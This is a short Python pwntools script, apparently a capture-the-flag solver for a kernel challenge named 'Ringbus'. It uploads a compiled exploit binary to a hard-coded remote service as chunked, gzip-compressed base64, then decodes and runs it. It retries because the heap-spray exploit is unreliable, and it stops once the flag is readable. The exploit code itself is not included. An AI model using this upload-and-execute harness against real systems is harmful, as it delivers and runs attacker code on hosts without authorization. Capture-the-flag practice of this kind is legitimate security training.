#!/usr/bin/env python3
import time,gzip,base64
from pwn import *

'''
# Ringbus Solver
- This script is not the actual exploit!
- It just transfers ./src/exploit to the remote.
- This script will continue sending and running until it works.
-- There is a (semi-rare) chance the exploit won't work due to the heap spray
not filling the hole adjacent to the vulnerable object.
-- It should work within 2-3 tries if it fails.
'''


# Time to wait for qemu boot
delay = 15
# Attempts to throw before giving up, usually works within 3
attempts = 15
# Useful for debugging, drop into interactive for each attempt
shell = False
# Exploit path
exploit = './src/exploit'
# Remote service to throw exploits at
serverinfo = ["3.145.135.24",8888]


log.info("===This exploit is unreliable!===")
log.info("This script will continue running\nthe solver until it succeeds.")

with open(exploit, 'rb') as f:
		b = base64.b64encode(gzip.compress(f.read())).decode('ascii')
log.info("Exploit length: "+str(len(b)))

for i in range(1,attempts):
	r = remote(serverinfo[0],serverinfo[1])
	log.info("Attempt "+str(i))
	log.info(str(delay)+" second delay to allow qemu boot")
	time.sleep(delay)

	r.sendline('cd /tmp')
	start = time.time()
	groups = group(300, b)
	for g in groups:
		r.clean()
		r.sendline('echo %s >> solve.gz.b64' % g)

	r.sendline('base64 -d ./solve.gz.b64 > solve.gz')
	r.sendline('gunzip solve.gz')
	r.sendline('chmod +x solve')
	print("Took: "+str(time.time()-start)+" seconds")
	r.sendline('./solve')
	if shell:
		log.info("Dropping shell Ctrl+C to go to next attempt")
		r.interactive()
		r.close()
	else:
		result = r.recvall(timeout=5)
		log.info(result[-400:])
		r.close()
		if "Flag is readable @ /flag" in str(result):
			log.success("Exploit succeeded in "+str(i)+" attempts!")
			lines = result.split(b'\n')
			flag = [line for line in reversed(lines) if line.strip() != b'']
			log.success(b"Flag: "+flag[1])
			break

